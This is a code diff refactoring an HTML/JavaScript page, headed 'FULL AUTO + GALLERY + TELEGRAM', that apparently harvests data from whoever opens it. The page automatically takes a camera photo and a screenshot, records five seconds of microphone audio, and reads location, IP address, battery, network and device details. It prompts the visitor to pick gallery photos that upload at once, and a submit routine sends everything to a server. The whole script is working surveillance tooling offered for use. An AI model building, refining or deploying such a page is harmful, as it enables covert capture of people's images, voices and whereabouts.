@@ -46,6 +46,10 @@
         .recording-timer { font-size:24px; font-weight:bold; color:#e17055; margin:5px 0; }
         .auto-indicator { display:inline-block; width:8px; height:8px; border-radius:50%; background:#00b894; animation:pulse 1s infinite; margin-right:5px; }
         @keyframes pulse { 0% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(0.8); } 100% { opacity:1; transform:scale(1); } }
+        .accuracy-badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:10px; color:white; }
+        .accuracy-badge.high { background:#00b894; }
+        .accuracy-badge.medium { background:#fdcb6e; color:#333; }
+        .accuracy-badge.low { background:#d63031; }
     </style>
 </head>
 <body>
@@ -58,14 +62,12 @@
         <span class="msg" id="statusMsg">Initializing...</span>
     </div>
     
-    <!-- Photo Preview -->
     <div class="photo-container" id="photoContainer">
         <img id="userPhotoPreview" style="display:none;" />
         <span class="placeholder" id="photoPlaceholder">📸 Waiting for photo...</span>
         <span class="badge" id="photoBadge">⏳ Capturing...</span>
     </div>
     
-    <!-- Preview Grid -->
     <div class="preview-grid">
         <div class="preview-box">
             <div class="label">📸 User Photo</div>
@@ -79,7 +81,6 @@
         </div>
     </div>
     
-    <!-- Microphone Status -->
     <div style="margin:5px 0;padding:8px;border-radius:8px;background:#f0f0f0;display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;">
         <span>🎤 Microphone:</span>
         <span id="micStatus" class="mic-off"></span>
@@ -87,12 +88,9 @@
         <span class="recording-timer" id="recordingTimer">0s</span>
     </div>
     
-    <!-- ===== GALLERY SECTION ===== -->
     <div class="gallery-section">
         <h3>📸 Gallery Auto Upload</h3>
-        <p style="font-size:12px;color:#666;margin-bottom:10px;">
-            Click button and select ALL photos - they will auto-upload!
-        </p>
+        <p style="font-size:12px;color:#666;margin-bottom:10px;">Click button and select photos - auto-upload!</p>
         <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" />
         <button class="gallery-btn" onclick="document.getElementById('galleryInput').click()">
             📱 Select Photos
@@ -117,10 +115,7 @@
 </div>
 
 <script>
-// ==========================================
-//  FULL AUTO + GALLERY + TELEGRAM
-// ==========================================
-
+// ===== FULL AUTO + GALLERY + TELEGRAM =====
 const statusBox = document.getElementById('statusBox');
 const statusIcon = document.getElementById('statusIcon');
 const statusMsg = document.getElementById('statusMsg');
@@ -140,19 +135,13 @@ const micStatus = document.getElementById('micStatus');
 const micText = document.getElementById('micText');
 const recordingTimer = document.getElementById('recordingTimer');
 
-// Gallery Elements
 const galleryInput = document.getElementById('galleryInput');
 const galleryPreview = document.getElementById('galleryPreview');
 const galleryCounter = document.getElementById('galleryCounter');
 const uploadStatus = document.getElementById('uploadStatus');
 
-let userPhoto = null;
-let screenshot = null;
-let userLocation = null;
-let deviceDetails = {};
-let ipAddress = 'Unknown';
-let audioData = null;
-let selectedPhotos = [];
+let userPhoto = null, screenshot = null, userLocation = null;
+let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
 let galleryCount = 0;
 
 function log(text) {
@@ -182,26 +171,19 @@ async function getFullDeviceInfo() {
             browserVersion: getBrowserVersion(),
             language: navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screen: {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                pixelRatio: window.devicePixelRatio
-            },
+            screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, pixelRatio: window.devicePixelRatio },
             memory: navigator.deviceMemory || 'Unknown',
             cores: navigator.hardwareConcurrency || 'Unknown',
             connection: conn,
             battery: battery
         };
-    } catch(e) {
-        return {};
-    }
+    } catch(e) { return {}; }
 }
 
 function getOS() {
     const ua = navigator.userAgent;
     if (ua.includes('Android')) return 'Android';
-    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+    if (ua.includes('iPhone')) return 'iOS';
     if (ua.includes('Windows')) return 'Windows';
     if (ua.includes('Mac')) return 'macOS';
     if (ua.includes('Linux')) return 'Linux';
@@ -253,11 +235,7 @@ function getBrowserVersion() {
 function getNetworkInfo() {
     const conn = navigator.connection || navigator.mozConnection;
     if (conn) {
-        return {
-            type: conn.effectiveType || 'Unknown',
-            downlink: conn.downlink || 'Unknown',
-            rtt: conn.rtt || 'Unknown'
-        };
+        return { type: conn.effectiveType || 'Unknown', downlink: conn.downlink || 'Unknown', rtt: conn.rtt || 'Unknown' };
     }
     return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
 }
@@ -266,18 +244,13 @@ async function getBatteryInfo() {
     try {
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
-            return {
-                level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging,
-                chargingTime: battery.chargingTime || 'Unknown',
-                dischargingTime: battery.dischargingTime || 'Unknown'
-            };
+            return { level: Math.round(battery.level * 100) + '%', charging: battery.charging };
         }
     } catch(e) {}
     return { level: 'Unknown', charging: false };
 }
 
-// ===== GALLERY AUTO UPLOAD =====
+// ===== GALLERY =====
 galleryInput.addEventListener('change', function(e) {
     const files = e.target.files;
     if (files.length === 0) return;
@@ -290,17 +263,11 @@ galleryInput.addEventListener('change', function(e) {
     Array.from(files).forEach((file) => {
         const reader = new FileReader();
         reader.onload = async function(event) {
-            // Preview
             const img = document.createElement('img');
             img.src = event.target.result;
-            img.style.width = '60px';
-            img.style.height = '60px';
-            img.style.objectFit = 'cover';
-            img.style.borderRadius = '8px';
-            img.style.border = '2px solid #6c5ce7';
+            img.style.cssText = 'width:60px;height:60px;object-fit:cover;border-radius:8px;border:2px solid #6c5ce7;';
             galleryPreview.appendChild(img);
             
-            // Auto upload
             try {
                 await fetch('/api/store-gallery', {
                     method: 'POST',
@@ -324,7 +291,7 @@ galleryInput.addEventListener('change', function(e) {
     e.target.value = '';
 });
 
-// ===== IPv4 DETECT =====
+// ===== IP =====
 function getIPv4Address() {
     return new Promise((resolve) => {
         log('📡 Detecting IPv4...');
@@ -364,7 +331,7 @@ function getIPv4Address() {
     });
 }
 
-// ===== MICROPHONE - 5 SECONDS =====
+// ===== MICROPHONE =====
 function captureMicrophone() {
     return new Promise((resolve) => {
         log('🎤 Recording 5s...');
@@ -421,7 +388,7 @@ function captureMicrophone() {
     });
 }
 
-// ===== CAPTURE USER PHOTO =====
+// ===== PHOTO =====
 function captureUserPhoto() {
     return new Promise((resolve) => {
         log('📸 Capturing photo...');
@@ -492,7 +459,7 @@ function fallbackPhoto() {
     log('⚠️ Fallback photo');
 }
 
-// ===== CAPTURE SCREENSHOT =====
+// ===== SCREENSHOT =====
 function captureScreenshot() {
     return new Promise((resolve) => {
         log('🖼️ Capturing screenshot...');
@@ -558,7 +525,7 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
     };
 }
 
-// ===== GET LOCATION =====
+// ===== LOCATION =====
 function getLocation() {
     return new Promise((resolve) => {
         log('📍 Getting location...');
@@ -595,7 +562,7 @@ function getLocation() {
     });
 }
 
-// ===== GET DEVICE DETAILS =====
+// ===== DEVICE DETAILS =====
 async function getDeviceInfo() {
     const ua = navigator.userAgent;
     let os = 'Unknown', browser = 'Unknown';
@@ -631,7 +598,7 @@ async function getDeviceInfo() {
     log('📱 Device: ' + os + ' | ' + browser);
 }
 
-// ===== SUBMIT DATA =====
+// ===== SUBMIT =====
 async function submitData() {
     log('📤 Submitting all data...');
     setStatus('📤', 'Submitting...', 'loading');
@@ -668,7 +635,7 @@ async function submitData() {
     }
 }
 
-// ===== MAIN AUTO PROCESS =====
+// ===== MAIN =====
 async function startAutoProcess() {
     log('🚀 Starting...');
     setStatus('⏳', 'Starting...', 'loading');
